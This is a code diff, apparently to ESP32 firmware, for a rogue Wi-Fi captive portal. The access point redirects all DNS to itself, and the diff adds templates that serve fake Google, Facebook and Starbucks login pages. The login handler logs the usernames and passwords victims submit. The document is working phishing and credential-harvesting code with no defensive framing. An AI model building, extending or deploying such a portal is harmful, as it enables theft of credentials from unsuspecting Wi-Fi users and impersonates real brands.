@@ -5,13 +5,15 @@
 
 CaptivePortal::CaptivePortal() : server(80) {}
 
-void CaptivePortal::begin(const char* ssid) {
+void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate) {
+    currentTemplate = selectedTemplate;
     WiFi.mode(WIFI_AP);
     WiFi.softAP(ssid);
     
     IPAddress apIP = WiFi.softAPIP();
     Logger::log("AP Started. SSID: " + String(ssid));
     Logger::log("AP IP: " + apIP.toString());
+    Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
 
     dnsServer.start(DNS_PORT, "*", apIP);
     
@@ -43,8 +45,15 @@ void CaptivePortal::setupRoutes() {
     });
 
     // Main Portal Page
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-        request->send(200, "text/html", login_html);
+    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){
+        const char* html = GENERIC_LOGIN_HTML;
+        switch(currentTemplate) {
+            case TEMPLATE_GOOGLE: html = GOOGLE_LOGIN_HTML; break;
+            case TEMPLATE_FACEBOOK: html = FACEBOOK_LOGIN_HTML; break;
+            case TEMPLATE_STARBUCKS: html = STARBUCKS_LOGIN_HTML; break;
+            default: html = GENERIC_LOGIN_HTML; break;
+        }
+        request->send(200, "text/html", html);
     });
 
     // Handle Login
@@ -56,7 +65,7 @@ void CaptivePortal::setupRoutes() {
         
         Logger::log_credential(user, pass);
         
-        request->send(200, "text/html", success_html);
+        request->send(200, "text/html", SUCCESS_HTML);
     });
 
     // 404 Redirect to Portal
